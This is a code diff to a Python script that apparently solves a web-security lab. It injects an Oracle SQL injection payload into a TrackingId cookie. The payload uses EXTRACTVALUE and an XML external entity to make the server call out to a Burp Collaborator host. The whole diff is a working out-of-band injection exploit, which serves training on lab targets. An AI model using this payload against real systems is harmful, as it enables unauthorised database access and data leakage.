@@ -30,30 +30,27 @@ def main(args):
     tracking_id = resp.cookies["TrackingId"]
     session_token = resp.cookies["session"]
     log.info(f"TrackingId: {tracking_id}")
-    exploit = (
-          f"{tracking_id}'+(SELECT EXTRACTVALUE(xmltype('"
-          '<?xml version="1.0" encoding="UTF-8"?>'
-          "<!DOCTYPE root [ <!ENTITY % remote SYSTEM " 
-          f"\"http://'||(select 'abcd' from dual)||'.{args.collab}/\">"
-          " %remote;]>'),'/l') FROM dual-- "
-)   
+    exploit = f"{tracking_id}'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//{args.collab}/\">+%25remote%3b]>'),'/l')+FROM+dual--"
     
-    """
-    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
-    """
-    exploit_encoded = urllib.parse.quote(exploit)
+    
     cookies = {
-        "TrackingId": exploit_encoded,
+        "TrackingId": exploit,
         "session": session_token,
-    }    
+    }
+    
+    #exploit_encoded = urllib.parse.quote(exploit)
+    #cookies = {
+    #    "TrackingId": exploit_encoded,
+    #    "session": session_token,
+    #}    
     log.info("Sending exploit")
     if args.no_proxy:
         resp = requests.get(shop.base_url, cookies=cookies)
     else:
-        resp = requests.get(shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
+        resp = requests.get(
+            shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
         )
     shop.is_solved()
-    log.info("laa-la-la-lal-a")
         
 if __name__ == "__main__":
     args=utils.parse_args_collab(sys.argv)
